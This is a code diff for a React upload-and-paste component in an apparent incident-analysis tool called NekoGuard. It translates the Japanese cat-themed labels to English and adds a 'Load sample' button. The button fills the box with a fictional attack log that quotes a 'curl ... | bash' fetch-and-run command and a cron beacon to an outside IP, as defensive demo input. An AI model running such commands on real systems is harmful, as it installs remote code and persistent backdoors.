@@ -35,13 +35,27 @@ export const IncidentDropzone: React.FC<Props> = ({ onFileSelect, onTextSubmit, 
       >
         <input ref={fileRef} type="file" className="hidden" accept="image/*,.log,.txt" onChange={handleFileChange} />
         <div className="text-5xl mb-3">📨</div>
-        <p className="text-gray-300 font-medium">怖いアラートのスクショやログをここに投げるニャ</p>
-        <p className="text-gray-500 text-sm mt-1">PNG / JPG / .log / .txt 対応</p>
+        <p className="text-gray-300 font-medium">Drop scary alerts or logs here, Nya!</p>
+        <p className="text-gray-500 text-sm mt-1">PNG / JPG / .log / .txt supported</p>
       </div>
 
       {/* テキスト入力 */}
       <div className="glass rounded-2xl p-4 space-y-3">
-        <p className="text-gray-400 text-sm font-medium">または、テキストで直接貼り付けるニャ</p>
+        <div className="flex items-center justify-between">
+          <p className="text-gray-400 text-sm font-medium">Or paste log text directly, Nya</p>
+          <button
+            className="text-xs text-indigo-400 hover:text-indigo-300 transition-colors"
+            onClick={() => setLogText(`2024-01-15 03:42:11 [CRITICAL] Unauthorized root login from 185.220.101.42 port 51234
+2024-01-15 03:42:15 [WARN] CREDENTIAL_ACCESS: .env read by unknown process (pid 9182) user=root
+2024-01-15 03:42:18 [CRITICAL] EXECUTION: curl https://malicious.sh | bash executed as root
+2024-01-15 03:43:02 [WARN] PERSISTENCE: New cron job added to /etc/cron.d/update: */5 * * * * curl http://45.142.212.100/beacon
+2024-01-15 03:43:10 [CRITICAL] BILLING_SPIKE: GCP API usage anomaly: 14800 requests in 15min (normal: ~1200/day)
+2024-01-15 03:43:15 [WARN] NETWORK: Outbound connection to known C2 server: 45.142.212.100:443`)}
+            disabled={disabled}
+          >
+            📋 Load sample
+          </button>
+        </div>
         <textarea
           className="w-full bg-black/30 border border-gray-700 rounded-xl p-3 text-sm font-mono text-gray-300 resize-none focus:outline-none focus:border-indigo-500 transition-colors"
           rows={4}
@@ -56,7 +70,7 @@ export const IncidentDropzone: React.FC<Props> = ({ onFileSelect, onTextSubmit, 
           onClick={() => onTextSubmit(logText)}
           disabled={disabled || !logText.trim()}
         >
-          🚀 NekoGuardに解析してもらうニャ！
+          🚀 Analyze with NekoGuard, Nya!
         </button>
       </div>
     </div>
